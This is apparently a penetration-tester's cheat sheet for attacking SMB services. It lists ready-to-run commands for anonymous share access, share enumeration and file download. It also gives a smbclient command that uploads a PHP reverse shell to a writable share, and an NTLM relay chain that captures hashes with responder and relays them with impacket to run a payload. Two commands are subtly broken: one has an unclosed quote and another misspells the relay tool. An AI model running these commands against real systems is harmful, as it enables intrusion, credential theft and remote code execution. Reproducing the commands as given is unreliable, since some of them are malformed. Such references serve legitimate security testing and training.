---
description: Server Message Block - Ports 445/139
icon: database
---

# SMB

<details>

<summary><mark style="color:orange;"><strong><code>smbclient</code></strong></mark></summary>

{% hint style="info" %}


#### <mark style="color:red;">`Without Credentials`</mark>

{% code title="List Resource list" %}
```sh
smbclient -L <IP>
```
{% endcode %}

{% code title="List Null session" %}
```sh
smbclient -N <IP>
```
{% endcode %}

{% code title="List User Share" %}
```sh
smbclient //IP/<SHARE> -U <USER>
```
{% endcode %}

{% code title="Connect to share" %}
```sh
smbclient -N \\\\IP\Share
```
{% endcode %}

{% code title="Without Credentials" %}
```sh
smbclient --no-pass //IP/<Share>
```
{% endcode %}

{% code title="Resources list + Null session" %}
```sh
smbclient -L \\10.10.10.123 -N
```
{% endcode %}

{% code title="Upload PHP reverse shell" overflow="wrap" %}
```sh
smbclient -N //10.10.10.123/Development -c 'put cmd.php tokyo.php
```
{% endcode %}
{% endhint %}

{% hint style="info" %}


#### <mark style="color:red;">`Download a File`</mark>

{% code title="Type this sequence" overflow="wrap" lineNumbers="true" %}
```sh
recurse
prompt
mget *
```
{% endcode %}
{% endhint %}

</details>

<details>

<summary><mark style="color:purple;"><strong>Enumeration</strong></mark></summary>

{% code title="Nmap Scan" %}
```sh
nmap --script smb-enum-shares.nse -p445 10.10.10.123
```
{% endcode %}

{% code title="Stealthy Nmap Scan" overflow="wrap" %}
```sh
nmap -n -Pn -vv -O -sV -script smb-enum*,smb-ls,smb-mbenum,smb-os-discovery,smb-s*,smb-vuln*,smbv2* -vv 192.168.1.1
```
{% endcode %}

{% code title="Metasploit Module" %}
```sh
use auxiliary/scanner/smb/smb_enumshares
```
{% endcode %}

{% hint style="info" %}
#### <mark style="color:orange;">**`smbmap`**</mark>

{% code title="Connect to host" %}
```sh
smbmap -H <IP>
```
{% endcode %}

{% code title="Connect with credentials" overflow="wrap" %}
```sh
smbmap -H <IP> -d <dns> -u '<user>' -p '<pass>'
```
{% endcode %}

{% code title="List Share" %}
```sh
smbmap -H <IP> -r <SHARE>
```
{% endcode %}
{% endhint %}

</details>

<details>

<summary><mark style="color:orange;"><strong><code>SAMBA</code></strong></mark></summary>

{% code title="Download file" overflow="wrap" %}
```sh
smbget -U <User> smb://IP/<SHARE_LOCATION> / --download
```
{% endcode %}

</details>

<details>

<summary><mark style="color:orange;"><strong><code>NTLM</code></strong></mark> <mark style="color:purple;"><strong>Relay Attacks</strong></mark></summary>

{% hint style="danger" %}


{% code title="Capture the Hash" %}
```bash
responder -I eth0 -dwv
```
{% endcode %}

{% code title="Relay the hash" %}
```bash
impacket-ntrlrelayx -tf target.txt -smb2support -c <payload>
```
{% endcode %}
{% endhint %}

</details>
